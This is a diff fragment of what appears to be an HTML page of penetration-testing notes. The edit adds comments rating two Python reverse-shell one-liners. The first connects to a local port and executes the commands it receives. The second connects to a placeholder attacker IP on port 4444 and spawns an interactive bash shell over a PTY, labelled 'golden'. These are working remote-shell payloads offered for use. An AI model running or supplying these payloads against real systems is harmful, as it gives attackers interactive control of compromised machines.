@@ -8,8 +8,8 @@
 </b>There are also SCTP modules in the repo above.<br/>
 Consider running these through python oneliner tool<br/>
 <br/>
-Example one-liner reverse_tcp<br/>
+Example one-liner reverse_tcp &lt;- not sure if working?<br/>
 python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect((‘127.0.0.1’,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"<br/>
 <br/>
-Example one-liner 'PTY'<br/>
+Example one-liner 'PTY' &lt;- golden<br/>
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</body></html>
